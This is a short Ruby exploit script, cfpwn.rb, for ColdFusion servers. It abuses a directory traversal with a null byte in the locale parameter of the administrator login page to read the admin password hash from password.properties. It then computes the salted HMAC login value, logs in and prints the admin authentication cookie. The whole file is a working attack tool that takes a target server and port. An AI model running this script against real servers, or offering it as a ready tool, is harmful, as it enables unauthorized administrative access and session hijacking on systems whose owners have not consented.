#!/usr/bin/env ruby

require 'net/http'
require 'net/https'
require 'openssl'

def usage
    puts "cfpwn.rb exploits a directory traversal flaw in ColdFusion servers"
	puts "to get the admin password hash and salt. The script then logs in "
	puts "to the server and gets the authentication cookie."
    puts
    puts "Usage: cfpwn.rb server port"
end

if not ARGV.length == 2
	usage
	exit(1)
end

server = ARGV[0]
port = ARGV[1].to_i

# Configure the HTTP object
http = Net::HTTP.new(server, port)
if port == 443 then http.use_ssl = true end

# These may have to be changed based on the details of the vulnerability
path = '/CFIDE/administrator/enter.cfm'
locale = 'locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en'

# Use the directory traversal to get the password from the password.properties file
headers = {
	'Host' => server,
	'Content-Type' => 'application/x-www-form-urlencoded',
	'Content-Length' => locale.length.to_s,
}

resp, data = http.post(path, locale, headers)

# Extract the password
data =~ /\<title\>.*password=([A-F0-9]+).*\<\/title\>/m
password = $1

# Extract the salt
data =~ /\<input name="salt" type="hidden" value="(\d+)"\>/
salt = $1

# Generate hmac_sha1 hash
hash = OpenSSL::HMAC.hexdigest('sha1',salt, password)

# Generate login request with salted hash
logindata = "cfadminPassword=#{hash.upcase}&requestedURL=%2FCFIDE%2Fadministrator%2Fenter.cfm%3F"
logindata += "&salt=#{salt}&submit=Login"

loginheaders = {
	'Host' => server,
}

# Print out the authenticaiton cookie
resp, data = http.post(path, logindata, loginheaders)
puts resp['set-cookie']
